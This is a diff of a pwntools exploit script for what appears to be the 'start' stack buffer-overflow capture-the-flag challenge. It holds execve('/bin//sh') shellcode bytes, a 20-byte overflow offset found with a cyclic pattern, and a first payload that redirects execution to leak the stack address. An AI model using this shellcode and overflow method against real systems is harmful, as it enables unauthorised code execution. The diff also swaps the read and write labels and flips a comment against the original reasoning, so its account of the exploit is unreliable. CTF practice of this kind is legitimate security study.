@@ -11,29 +11,24 @@ context.log_level = 'DEBUG'
 context.binary = binary
 e = ELF(binary)
 
-write_func = pack(0x8048087)
-write_func
+read_func = pack(0x8048087)
+read_func
 exit_func = pack(0x804809d)
 execve = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f" \
 "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 
 '''
-buf_start was discovered after finding how many bytes causes bof.
 Running crash script displays cylclic pattern byte count found in eip.
 
-$ ./crash.py --binary ./start --min 40 p
+$ ./crash.py --binary ./start --min 60 p
 ...
 EIP: 0x61616166
 Found payload pattern 0x61616166:faaa in register eip at pattern offset 20 of payload.
 Found pattern in stack through esp:0xffffd2ec->gaaa indirection, at pattern offset 24
-...
-
-We can also confirm that 20 bytes of data written to stack before overflow because
-write() call allocates 0x14
 '''
 buf_start = 20
 
-payload_1 = fit({buf_start:[write_func]})
+payload_1 = fit({buf_start:[read_func]})
 
 # Turn off for testing.
 # io = process(binary,aslr=False)
@@ -42,7 +37,7 @@ io = process(binary,aslr=True)
 # Welcome message printed
 io.recv()
 
-# First payload bof read() and payload will jump to write() for sp addres leak
+# First payload bof write() and payload will jump to read() for sp addres leak
 io.send(payload_1)
 
 # stack info now leaked
